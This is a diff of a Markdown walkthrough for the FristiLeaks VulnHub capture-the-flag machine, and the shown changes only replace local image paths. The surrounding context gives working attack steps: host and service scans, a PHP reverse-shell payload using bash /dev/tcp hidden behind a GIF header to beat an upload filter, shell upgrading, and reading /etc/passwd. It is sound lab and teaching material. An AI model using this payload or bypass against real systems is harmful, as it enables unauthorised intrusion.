@@ -56,7 +56,7 @@ nmap -sn 192.168.80.0/24
 
 This NMAP command will perform a ping scan (host-discovery) for every address located in the range of `192.168.80.0/24` or in regular notation `192.168.80.0 - 192.168.80.255`
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\init_nmap.png)
+![](./init_nmap.png)
 
 We can see that there were 3 hosts discovered on the network: Our default gateway at `192.168.80.1`, our pentesting box at `192.168.80.129`, and an unknown host at `192.168.80.133` which is our vulnerable VM.  With the address of our target discovered, we can enumerate further and find information about the running services and open ports of the target machine.
 
@@ -74,7 +74,7 @@ nmap -sS -sV -p- -T4 192.168.80.133
 >
 > 192.168.80.133 is our target
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\nmap_service.png)
+![](./nmap_service.png)
 
 This scan reveals little information, the only service revealed from the service scan is that there is an apache webservice running on port 80.
 
@@ -82,7 +82,7 @@ This scan reveals little information, the only service revealed from the service
 
 The landing page for the web service is a simple webpage giving credit to the creators of the challenge, and displaying an image about Fristi.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\frist_home.png)
+![](./frist_home.png)
 
 There is no information to be gained from this page, and there is no other leads to go on, so we will start analyzing the webservice from square one.  The first two things I do when approaching a webservice is to begin a Dirbuster, and Nikto scan.
 
@@ -90,7 +90,7 @@ There is no information to be gained from this page, and there is no other leads
 
 Dirbuster is an important tool to run during the initial discovery of a web service.  Dirbuster will validate the existence of filepaths and directories located on the web server using brute force.  Because it uses brute force, it is important to make sure that the target does not have any sort of IPS/IDS because we will be making a lot of requests to the server.  We start dirbuster by simply passing the target webservice as a parameter, and clicking run.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\dirbuster.png)
+![](./dirbuster.png)
 
 #### Nikto
 
@@ -100,29 +100,29 @@ Nikto is a web vulnerability scanner designed to point out obvious vulnerabiliti
 nikto -h 192.168.80.133
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\nikto.png)
+![](./nikto.png)
 
 After running these two scans, we can see there are some directories that we can navigate to, in order to get some more information: `/cola/`, `/sisi/`,`/beer/`.  Navigating to these images reveals the same result for each of them.  Further digging into each of the images reveals no difference, each of the files is named `343770.jpeg` and contain the exact same information.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\badurl.png)
+![](./badurl.png)
 
 After a lot of random poking around the website with no luck, playing on the name of the challenge and all of the aptly named directories, a peak at `/fristi/` reveals some more interesting information.
 
 * **Note:** *Dirbuster/Nikto work off of brute forcing from wordlists, uncommon words specific to challenges e.g. Fristi will usually not be discovered via these tools*
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\frist_main_login.png)
+![](./frist_main_login.png)
 
 This looks like a simple login page, but before we do any sort of manual testing into the website, it is always important to further enumerate in the background.  We will spool up Dirbuster again but give it the knowledge that a directory named `fristi` exists, and then it can brute force file names from that starting point.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\new_dirbuster.png)
+![](./new_dirbuster.png)
 
 And immediately after restarting Dirbuster with the new starting point we begin to enumerate more details about the web service: `index.php`, `upload.php`, `do_upload.php`, `checklogin.php` however all of these pages redirect us to the `main_login.php` page.  After a couple of basic XSS and SQL injection attempts, I wasn't able to get any sort of error redirect, or script injection.  So either the service is suppressing the `Error: 5**` HTTP messages, or there is no injection available (that was tried).  So taking a look at the source code for page reveals some interesting information:
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\loginsource.png)
+![](./loginsource.png)
 
 We see a message left by the developer that all of the images are encoded in base64 (which we can tell by the `==` appending each string), and that the author of this webpage, or at least some of it is `eezeepz`.  Scrolling down further reveals a commented out base64 string that isn't enclosed in `<img>` tags.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\imagehidden.png)
+![](./imagehidden.png)
 
 Copying this base64 string and removing the newline endings via Vim's `s` utility 
 
@@ -136,7 +136,7 @@ and then running it through the Linux built in base64 utility reveals junk
 base64 -d infile
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\junk.png)
+![](./junk.png)
 
 but what we can see is that the File Signature at the top is the default PNG file signature, which makes sense because all of the images on the site are encoded in base64.  So changing the file extension to end in PNG and then opening the file reveals the following image:
 
@@ -144,11 +144,11 @@ but what we can see is that the File Signature at the top is the default PNG fil
 mv tmp tmp.png
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\hidden.png)
+![](./hidden.png)
 
 Now this could be a lot of things, a filename located on the service, a directory, or a password, and the first thing that came to mind was a User/Pass combination of this text, and the user `eezeepz`. 
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\login.png)
+![](./login.png)
 
 * **Note** *the beautiful plaintext password field*
 
@@ -156,7 +156,7 @@ sending off the request with the new login details reveals a new page `login_suc
 
 a redirect to the `upload.php` page previously denied access to.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\upload.png)
+![](./upload.png)
 
 The site presents us with an upload button, and a browse button and prompts an image upload.  My first reaction is to upload a PHP file with code in it to spawn a reverse shell.  Create a new file, add this code in, and upload it to the server and hope.
 
@@ -167,7 +167,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.80.129/1234'");?>
 
 I didn't expect it to be that easy and it wasn't, we are greeted with an error page indicating that the only allowed file extensions are `png`, `jpg`, and `gif`.  This however is a very easy workaround, we can just prepend the GIF File Signature to the beginning of our shellcode, and then name it GIF and be on our way.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\doupload.png)
+![](./doupload.png)
 
 That was an easy bypass, now all that needs to be done is to include the file on the server, and spawn a reverse shell.  In order to receive the connection from the server we need to begin listening on the specified  IP and port that is in our shellcode. 
 
@@ -197,7 +197,7 @@ The server will utilize the PHP file extension when including the file on the pa
 
 >192.138.80.133/fristi/uploads/prevshell.php.gif
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\lowprivshell.png)
+![](./lowprivshell.png)
 
 And we've popped a low privilege shell on target computer, without job control and no TTY spawned.  A quick trick to actually spawn a job control shell via a reverse shell is:
 
@@ -205,7 +205,7 @@ And we've popped a low privilege shell on target computer, without job control a
 python -c "import pty; pty.spawn('/bin/bash')"
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\info.png)
+![](./info.png)
 
 After gaining a real shell, we can run some more commands to gain some information about who we are and what the system is running.
 
@@ -220,10 +220,10 @@ netstat -ano
 cat /etc/passwd
 ```
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\users.png)
+![](./users.png)
 
 As we can see, there are multiple extra users on this system that we might be able to escalate to root through, we can try one of the users that we already know their information `eezeepz`.  Navigating to `/home/eezeepz` there are a lot of files that look like symlinks to regular system binaries that we can run and a file named notes.txt.
 
-![](C:\Users\mcAnderson\Documents\Intern\Vulnhub\FristiLeaks\notes.png)
+![](./notes.png)
 
 Well this seems really simple and straightforward, we can do exactly as the note says and create a file
